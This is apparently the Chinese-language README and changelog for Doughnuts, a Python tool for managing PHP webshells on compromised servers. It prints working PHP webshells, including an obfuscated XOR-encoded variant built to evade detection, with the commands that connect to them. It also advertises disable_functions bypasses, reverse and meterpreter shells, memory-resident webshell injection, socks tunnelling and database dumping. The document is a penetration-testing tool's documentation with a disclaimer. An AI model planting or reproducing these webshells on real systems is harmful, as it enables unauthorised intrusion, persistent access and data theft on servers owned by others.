# Doughnuts

*一个基于Python3.6+的PHPwebshell管理器*


<p align="center">
     <a target="_blank" href="https://github.com/Stakcery/MagicStick">
        <img alt="" src="https://img.shields.io/github/stars/WAY29/Doughnuts?style=flat"/>
     </a>
     <a target="_blank" href="https://github.com/WAY29/Doughnuts/blob/master/LICENSE">
        <img alt="" src="https://img.shields.io/badge/license-MIT-green"/>
     </a>
     <a target="_blank" href="https://github.com/php/php-src/tree/PHP-7.0.0">
        <img alt="" src="https://img.shields.io/badge/python-%5E3%2e6-blue"/>
     </a>
     <a target="_blank" href="https://github.com/Stakcery/MagicStick">
        <img alt="" src="https://img.shields.io/github/watchers/WAY29/Doughnuts"/>
     </a>
     <a target="_blank" href="https://www.codacy.com/gh/WAY29/Doughnuts/dashboard?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=WAY29/Doughnuts&amp;utm_campaign=Badge_Grade">
        <img alt="" src="https://app.codacy.com/project/badge/Grade/dc3e98656257440da1f40bfa49f185e3"/>
     </a>
</p>

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302002860.png)

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112301953207.png)

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112301954136.png)

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112301954927.png)

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112301954410.png)

![](https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112301955714.png)

## 使用文档

~~终于迎来了新的使用文档！~~

***文档中许多内容已经过期，请以新版为准***

详细使用文档请前往[此页面](https://doughnuts3.gitbook.io/)进行查看。

## 特征

- 支持连接,记录,管理webshell,方便下一次连接
- 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式
- **请求与响应伪装**
- 支持编码payload(已内置base64,str_rot13,hex,doughnuts四种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell
- **支持绕过open_basedir**
- **支持多种方式绕过disable_functions**
    - 自动识别
    - php7-backtrace
    - php7-gc
    - php7-json
    - php7-splDoublyLinkedList
    - LD_PRELOAD
    - FFI
    - COM
    - imap_open
    - MYSQL-UDF
    - fpm(支持四种攻击方式，sock和端口的攻击方式)
    - apache-mod-cgi
    - iconv
    - FFI-php_exec
    - php7-reflectionProperty
    - user_filter
- 核心功能
    - 获取网站,系统,进程信息
    - 输出disbale_functions
    - 寻找可写的PHP文件(以树状结构显示)
    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
    - 执行自定义的php代码
    - 获取一个临时的非完全交互式shell和webshell
    - 正向/反弹shell
    - 可以支持弹meterpreter的shell(php代码实现)
    - (仅限双方均为*unix)获取完全交互式的反弹shell
    - 读/写/上传/下载/删除/搜索文件,目录打包,分段文件上传/下载
    - 数据库管理,临时的sql-shell,数据dump,分段dump
    - **端口扫描**
    - **出网检测**
    - **集成neo-regeorg，一键开启socks5服务器**
    - 内网网页文本式浏览代理，可自定义请求方法和数据
    - 检测suid文件并给出提权建议 / 检测杀毒软件
- 易于扩展

## 依赖

- Python3.6+
- Python-requests
- Python-pysocks
- Python-colorama
- Python-prettytable

## 安装/运行方法

***请在3.2版本之前运行过`python3 -m doughnuts.install`安装的朋友在更新3.2版本之后重新执行此命令!***

- 使用pip安装

```sh
# 安装
python3 -m pip install doughnuts --user -i https://pypi.org/simple/
# (windows)添加一个bat文件到python根目录下
# (*unix)添加一个可执行文件到/usr/local/bin下
# 安装启动器,以方便调用
python3 -m doughnuts.install
# 运行
doughnuts
# 或
python3 -m doughnuts
# enjoy it!
```

- 通过poetry安装

```sh
pyton3 -m pip install poetry # 或其他方法安装python-poetry
git clone https://github.com/WAY29/Doughnuts.git
cd Doughnuts
# debian/ubuntu系统需要运行此命令
apt-get install python3-venv
# 安装
poetry install
# 运行
poetry run python3 Doughnuts/doughnuts.py # 应该对所有系统生效
# enjoy it!
```

- 直接安装

```sh
# 安装PYTHON 3.6+
git clone https://github.com/WAY29/Doughnuts.git
cd Doughnuts/doughnuts
pip3 install -r requirements.txt 或 pip3 install requests pysocks colorama prettytable tqdm
# (windows)添加一个bat文件到python根目录下
# (*unix)添加一个可执行文件到/usr/local/bin下
# 安装启动器,以方便调用
python3 install.py
# 运行
doughnuts
# 或
python3 doughnuts.py
# enjoy it!
```

- 使用docker

```bash
# 启动一个doughnuts容器
docker run --name doughnuts -itd longlone/doughnuts
# 执行doughnuts容器的bash
docker exec -it doughnuts bash
# 在容器中运行doughnuts,这样你可以存储webshell记录等
doughnuts

# 或者直接执行doughnuts
docker run --rm -it longlone/doughnuts:cli
```

## 使用例子

*由于windows原因，在windows命令行连接下不支持&符号连接参数。
尽量将额外参数包裹引号进行传递，且逐一拆分。
好的习惯:"data:a=123" "data:b=456"
坏的习惯:"data:a=123&b=456" (在windows命令行下会连接失败)*

1. 普通webshell:

    - 最平凡的webshell:

        ```php
        //test1.php
        <?php
        error_reporting(0);
        eval($_POST['2333']);
        ?>
      ```
      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
      ```
      connect http://localhost/test1.php POST 2333
      ```
      
    - 带解码的webshell:

        ```php
        //test2.php
        <?php
        error_reporting(0);
        eval(str_rot13(base64_decode($_REQUEST['2333'])));
        ?>
      ```
      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
      
      ```
      connect http://localhost/test2.php POST 2333 rot13 base64
      ```
      
    - 需要额外参数与解码的webshell:

        ```php
        //test3.php
        <?php
        if(@md5($_POST['a']) == "202cb962ac59075b964b07152d234b70"){  // a=123
        	@eval(base64_decode($_POST['2333']));
        }
        ```

        那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:

        ```
        connect http://localhost/test.php POST 2333 base64 "data:a=123"
        ```

2. 生成webshell:
    1. 运行doughnuts
    2. 执行`generate a.php POST pass salt 1`生成webshell,名字为a.php
    3. 上传a.php 根据提示执行`connect {木马url} POST pass doughnuts-salt`连接webshell

## 自定义编码器
1. 进入doughnuts/encode目录
2. 新建/拷贝一个py文件,起一个名字,以time.py为例
3. 文件中只需要写一个run函数,类似于
```python
from libs.config import alias


@alias(True)
def run(data: str):
    cipher = data
    return cipher
```
4. 参数解释: data是传输的数据,为字符串,cipher为传出的数据,也应该为字符串
5. 重启doughnuts即可使用`se/show_encoders`命令查看自定义的编码器,连接时使用`connect URL 请求方法 密码 编码器名字`即可使用自定义编码器
6. 一个例子,以时间为秘钥的编码器
```python
from libs.config import alias
from hashlib import md5
from base64 import b64encode
import time


@alias(True)
def run(data: str):
    format_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())
    key = md5(format_time.encode()).hexdigest().encode()
    data = data.encode()
    cipher = bytes(data[i] ^ key[i % 32] for i in range(len(data)))
    cipher = b64encode(cipher).decode()

    return cipher
```
对应的php webshell
```php
<?php 
class COMI { 
    public $c='';
    function __destruct() {
        return eval(substr($this->c, 0));
    }
}
date_default_timezone_set("PRC");
$comi = new COMI();
$password = &$password1;
$password1 = $_REQUEST['x'];
$post = &$password;
$post=base64_decode($post);
$key=md5(date("Y-m-d H:i",time()));
for($i=0;$i<strlen($post);$i++){
    $post[$i] = $post[$i] ^ $key[$i%32];
}
$lnng1 = &$lnng;
$lnng = $post;
$lnng2 = $lnng1;
@$comi->c = substr($lnng2, 0);
?>
```

## 自定义webshell模板
1. 进入doughnuts/webshell_plugins目录
2. 新建/拷贝一个py文件,起一个名字,以test.py为例
3. 文件中只需要写一个get_php函数,类似于
```python
def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
    ...
```
4. 各个参数解释
    - keyword是一个数字对应一种请求方式,分别对应: GET->3 POST->4 COOKIE->5 HEADER->6
    - passwd是连接webshell的密码
    - salt是用于加密算法的盐,你可以不需要使用这个参数,但是函数定义里必须存在
5. 重启doughnuts或者在doughnuts使用`reload generate`重新加载generate命令,即可使用doughnuts生成自定义webshell

## 参考

- https://github.com/WangYihang/Webshell-Sniper
- https://github.com/epinna/weevely3

## 更新日志

### 4.24.0
- 4.24.0 
    - 新增功能
        - memshell: 通过交互式操作注入php内存马，仅作用于fastcgi,详情请看[这里](https://tttang.com/archive/1720/)
    - 优化
      - 优化bdf-fpm的逻辑，修复一些bug
### 4.23.0
- 4.23.0
    - 新增功能
        - bdf-php-concat_function: 对应数字17，详情请看[这里](https://github.com/mm0r1/exploits/tree/master/php-concat-bypass)
- 4.23.1
    - 修复bug
        - connect: 某些webshell无法连接的问题 (出现 IndexError)
        - cat: 在使用DOMDocument读取文件时没有base64解码的错误
        - portscan: 无法使用的问题
        - upload: 使用file_put_contents上传文件时错误的问题
- 4.23.2
    - 修复bug
        - 在linux下调用vi编辑器会导致无法写入的问题
        - webshell/db_shell/shell 命令现在会根据switch命令切换原始/补全模式
- 4.23.3
    - 修复bug       
        - upload无法使用的bug
        - 在艰难环境下连接webshell的优化

### 4.22.0

- 4.22.0
  - 新增功能
    - extension
      - 查看当前php所装扩展
  - 优化功能
    - 去除安装脚本中部分多余代码
    - 用随机字符标识替代原先固定标识符的webshell是否存活检测
    - 现在输入完整命令后按方向键(→)或tab显示候选参数
    - 现在会根据自带的base64函数是否可用自动补上base64函数头
    - cat
      - 现在会根据情况自动选择读取文件方式
    - write
      - 现在会根据情况自动选择写入文件方式
  - 重构代码
    - 在libs目录中加上如functions/[插件目录]/[插件函数]形式，便于插件可读性的提高
    - 对myapp.py中大部分php代码进行包装转移
    - 对connect.py中部分php代码进行包装转移
    - 对webshell_plugins内大部分插件的php代码进行包装转移
  - 修复bug
    - readline:
      - 在自动补全参数时有可能会重复补全命令的错误
      - 无法对general中命令参数进行自动补全的错误
      - 有关debug代码部分的错误
    - 更正部分文本错误，去除部分多余代码

### 4.21.0

- 4.21.0
    - 新增功能
        - bdf-shellshock: 对应数字16，Bash破壳（CVE-2014-6271)漏洞
    - 修复bug
        - bdf-fpm:
            在某些情况下误判目标并不是使用fpm启动，现在解除这个限制，由使用者自己决定
### 4.20.0
- 4.20.0
    - 新增特性
        - 在极端环境下连接webshell
    - 新增功能
        - bdf: 12-iconv 增加bypass函数

### 4.19.0
- 4.19.0
    - 新增功能
        - bdf: 新增user_filter模式，适用于7.0-8.0所有版本
### 4.18.0
- 4.18.0
    - 修复bug
        - proxy: 可能失效的问题
        - db_shell: 命令重复执行

    - 优化功能
        - upload
            - 使用$_FILES上传失败时显示失败原因
        - socks
            - windows下http path的默认值使用/替换\
    - 新增功能
        - db_exec
            - 启动编辑器执行任意sql语句
- 4.18.1
    - 修复bug
        - db_mdump
            - 重试无效的问题
            - 线程不安全导致dump的数据不全或重复的问题
            - 数据为空时与数据类型不匹配的问题,将''替换为null
- 4.18.2
    - 修复bug
        - mdownload
            - 重试后无论如何都显示下载失败
    - 优化功能
        - 使用自定义的函数获取php配置选项的值，而非ini_get
        - getenv
            - 使用自定义的函数获取php配置选项的值，而非ini_get
        - mdownload
            - 添加hash验证
            - 增加提示
            - 使用临时文件而非内存存储chunk
        - 请求: 添加重试次数2
- 4.18.3
    - 修复bug
        - mdownload,download在下载时会创建文件夹
        - write写入文件名错误
        - edit编辑文件时为空
    - README
        - 添加shields
### 4.17
- 4.17.0
    - 添加说明
        - bdf: 补充4.15新增的fpm-ftp模式的说明
    - 新增功能
        - bdf-fpm:
            - (实验性功能，不稳定)现在会询问是否在所有请求中都攻击fpm以获取结果，可以用于绕过open_basedir等限制，暂不支持ftp模式
        - system:
            - 若命令以&结尾，则会将其起新线程挂在后端执行

        

### 4.16
- 4.16.0
    - 优化功能
        - socks
            - 支持代理选项,支持如`http://127.0.0.1:1080/` 或 `socks5://127.0.0.1:1080/`的代理
            - 支持在fsockopen被禁用时使用pfsockopen
            - 更改说明,只支持5.4.0及以上版本
    - 新增功能
        - phpinfo
            - 调用默认浏览器显示phpinfo信息
    - 修复bug
        - bdf LD_PRELOAD模式 mb_send_mail无法成功bypass
        - 修复某些命令会输出debug消息的bug
        - fwpf无法生效
        - connect时额外参数有多个:或者=号时程序异常
        - download，mdownload:指定文件保存名时认为是目录的bug
- 4.16.1
    - 优化功能
        - 删除generate的非交互输出
        - 修改reverse的文档，windows-php不建议使用
        - connect:假如ini_get被禁用也能够链接
        - bdf-10-fpm
            - http_sock: 支持stream_socket_client函数作为备用
            - ftp: 新增ftp模式，通过在目标机器构建一个虚假的ftp服务器以实现ssrf攻击fpm
        

### 4.15
- 4.15.0
    - 修改别名
        socks -> old_socks
    - 新增功能
        - bdf
            - 增加FFI-php_exec, php7-reflectionProperty模式
        - outnetwork
            - 快速检查目标机器是否能出网
        - socks
            - 启动一个socks服务器,上传并连接远程的webshell管道以实现内网穿透的功能(power by neo-regeorg)
    - 修改输出
        write
    - 修复bug
        - 无法使用参数短别名
        - requirements.txt中的urllib3版本修改为1.26.5
- 4.15.1
    - 修改bug
        - ps命令在无法读取/proc目录时没有输出报错
        - execute,write,edit无法使用自定义编辑器或报错
    - 修改输出
        - touch
    - 优化功能
        - execute,write,edit
            - 现在编辑一个临时的php文件而非无后缀文件
            - 添加参数edit_args,用于提供编辑器的参数,例如execute code '"--wait"'
            - 当使用code(即vscode)时会自动添加--wait参数
    

### 4.14
- 4.14.0
    - 新增功能
        - bdf
            - 增加iconv模式
    - 修复bug
        - edit, upload
        - bdf apache-mod-cgi模式 在切换目录之后无法执行系统命令,现在固定在webshell目录中上传.htaccess和cgi脚本
- 4.14.1
- 4.14.2
    - 修复bug
        - 在Python3.9中报错
            -bindshell, remp, reverse, socks
        - gululingbo模板生成的webshell没有php头
        - log命令默认参数时提示File path is invalid
- 4.14.3
    - 修复bug
        - 在windows下连接使用额外参数时错误
        - ls显示带有空格文件名的文件的时候显示不全
    - 删除特性
        - 不再能从外部使用connect命令

        
### 4.13
- 4.13.0
    - 新增功能
        - bdf
            - 增加apache-mod-cgi模式
- 4.13.1
    - 修复bug
        - iconv.c源码
### 4.12
- 4.12.0
    - 新增功能
        - bdf
            - 修改ld_preload部分,重构代码,支持x86 linux
            - 为udf部分切割代码
        - reverse
            - 修改默认反弹类型,默认会根据目标系统选择powershell/bash
            - 添加bash_exec类型,使用exec和管道符实现
        - search
            - 添加别名find, 最后结果以绝对路径显示
        - remp
            - 支持pfsockopen, 删除bash类型的反弹,将其移到reverse命令
        - upload
            - 新增参数upload_type,支持file_put_contents直接写入内容,同时优化输出
    - 修复bug
        upload
    - 添加注释
        bdf, reverse, av, checkvm
    - 修改帮助文档
        bdf, reverse, bobd, search, upload
    - 重构代码
        search, bdf, upload
    - 修改分类
        - verbose general->COMMON
### 4.11
- 4.11.0
    - 修改命令
        - bdf命令 重写fpm部分,使用antsword的[bypass_disable_functions扩展](https://github.com/Medicean/as_bypass_php_disable_functions)
            现在支持三种attack_type: gopher,sock,http_sock
            - gopher: 使用curl扩展与gopher协议攻击fpm端口
            - sock: 使用stream_socket_client攻击fpm-sock
            - http_sock: 使用fsockopen,pfsockopen连接fpm端口
    
- 4.11.1
    - 修改fpm的sock和http_sock攻击方式,防止整个doughnuts卡死
- 4.11.2
    - 修复无法使用`python3 -m doughnuts`启动doughnuts的bug
### 4.10
- 4.10.0
    - 修改命令
        - touch命令 支持windows,不再调用系统命令去实现
- 4.10.1-3(废弃版本)
- 4.10.4
    - 添加缺少的依赖到requirements.txt: six
- 4.10.5
    - 添加docker并上传到dockerhub,可以使用docker命令一键起doughnuts
### 4.9
- 4.9.0
    - 修改核心
        - 添加custom_plugins目录,用于存放用户自己编写的插件
        - 添加config.ini文件,用于配置相关参数
- 4.9.1
    - 修复在pypi版本与github版本不一致的问题
- 4.9.2
- 4.9.3, 4.9.4
    - 修复在不存在自定义命令时连接webshell后帮助菜单无法显示的bug

### 4.8
- 4.8.0
    - 修改命令
        - generate命令 现在支持在自定义webshell模板,在doughnuts/webshell_plugins下可以添加自己的模板,详情请查看上面的自定义webshell模板
- 4.8.1
    - 优化代码结构
    - 优化doughnuts加密算法
    - 修复enrecv不存在的问题

### 4.7
- 4.7.0
    - 修改命令
        - remp命令 修改php模式的payload,添加bash和python的payload
        - bdf命令 php-fpm模式(https://xz.aliyun.com/t/5598)

### 4.6
- 4.6.0
    - 添加命令
        - verbose命令 用于开启/关闭提示符的详细信息显示

### 4.5
- 添加命令
    - enrecv命令 用于随时开启/关闭回显加密
    - remp命令 可以简易的弹一个meterpreter的shell
- 修复bug
    - 修复回显加密在弹shell时可能会出现解码错误的问题
- 4.5.1
    - 现在使用随机字符作为连接是否成功的判断以防特征检测
- 4.5.2
    - 添加命令
        - mkdir命令 创建文件夹
        - rmdir命令 删除空文件夹

### 4.4
- 修改核心
    - 使用算法将回显加密
- 4.4.1
    - 修复bug
        - **回显加密在php5会出错**
- 4.4.2
    - 修改命令
        - touch命令 提示修改
        - ps命令    提示修改,只允许在*unix目标上运行
    - 修复bug
        - 曾导致在linux下调用vi编辑器失败

### 4.3
- 修改命令
    - portscan去除短名ps, 修改显示结果,变得更加可读
    - bobd支持在ini_set被禁用时使用ini_alter
    - bdf php7-backtrace 添加在Exception类被禁用后使用Error类
- 添加命令
    - copy命令 用于复制文件
    - ps命令 类似于linux下的ps命令,用于读取系统进程信息
- 修复bug
    - 在back返回主菜单后清理mysql连接记录


### 4.2
- 修改结构
    - myapp尝试丢弃webshell执行代码之前的输出
- 添加命令
    - mdownload命令 用于分块下载文件
- 修改命令
    - mupload命令 完全重写,真正意义上的分块上传,修复mupload上传失败不会自动清理临时文件的问题
- 修复bug
    - 修复mdownload, mupload没有ls后补全的问题
- 新增依赖
    - tqdm
- 4.2.1
    - 修改命令
        - db_mdump命令 优化,去除key键,去除表结构中的Not NULL, 使用mysql_real_escape_string转义




### 4.1
- 修改结构
    - 新建插件时不再需要更改helpmenu.py


### 4.0
- 修改命令
    - 修复当使用mysqli扩展链接mysql数据库时db_info显示的问题
    - 修复当使用pdo扩展链接数据库时无法db_dump的问题
    - 修复某些文本错误
    - db_dump命令 
        - 不再目标主机上写入文件而是直接下载到本地,修改参数{web_file_path}->{local_path}
        - 添加参数 {table} 用于指定数据表,默认存储文件名为{database}.{table}.sql
    - dump命令
        - 修复一个bug曾导致路径拼接时使用\转义了外部php的引号导致的报错
- 添加命令
    - db_mdump命令 用于分块dump数据库
- 4.0.1
    - 修复了db_mdump导出的数据库encoding错误导致sql文件无法导入的问题
- 4.0.2
    - 修复了db_mdump数据重复的问题
- 4.0.3
    - 删除测试输出,删除db_mdump中DROP DATABASE语句

## 免责声明

本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.
